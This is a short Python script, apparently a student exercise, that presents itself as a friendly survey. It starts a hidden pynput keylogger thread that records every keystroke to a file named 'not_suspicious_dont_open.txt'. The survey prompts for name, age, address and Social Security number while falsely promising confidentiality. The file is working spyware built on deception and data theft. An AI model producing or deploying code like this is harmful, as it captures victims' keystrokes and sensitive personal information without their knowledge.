import threading  #Had to look up ways to run the keylogger and program at the same
                  #time and this seemed like the easiest option
from pynput import keyboard

#File for storing keylog 
keylog = "not_suspicious_dont_open.txt"

class KeyLogger:
    def __init__(self, fileName):
        self.fileName= fileName
    def start(self):
        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()
    
    def on_press(self, key): #I used this function based on how it is presented in the
        try:           #pynput documentation with a little tweaking 
            log = f'{key.char}\n'
        except AttributeError:  #Error exception for non-alphanumeric keys
            log = f'Special key {key} pressed\n'
        
        with open(keylog, 'a') as keylog_file: #appends keystrokes to keylog file
            keylog_file.write(log)
      
        if key == keyboard.Key.esc:        
            print('Terminating key logger...')
            return False 
        
#Function to entice user to enter information
def user_info():
    while True:
        name = input('What is your name? ').strip() #Uses strip to get rid of extra spaces if accidentaly added
        if name.isalpha():
            break
        print("Error: Name must contain only letters.")  

    while True:
        age = input('What is your age? ').strip()
        if age.isdigit():
            break
        print("Error: Age must be a valid number.")
        
    while True:
        addy = input('What is your address? ').strip()
        if addy.replace(" ", "").isalnum():  #Fixed an issue not allowing spaces in addresses
            break
        print("Error: Address must be a valid address.")
        
    while True:
        ssn = input('What is your SSN? ').strip()
        if ssn.isdigit():
            break
        print("Error: SSN must be a valid SSN.")
    
    #Dictionary for storing user information
    return {"name": name, "age": int(age), "address": addy, 'SSN': int(ssn)}

#Main function 
def main():
    print('Hello, welcome to our short survey!')
    print('We are going to ask a couple of questions. Please answer honestly!')
    print('We assure you your answers are confidential and will not be sold or anything like that, promise.')

    keylogger = KeyLogger('log.txt')
    keylogger_thread = threading.Thread(target=keylogger.start, daemon=True) #Starts keylogger in a separate thread

    keylogger_thread.start()

    user_data = user_info()
    
    #Closing message
    print("Survey completed. Thank you!")
    print("Here's a copy of your answers:", user_data)

main()
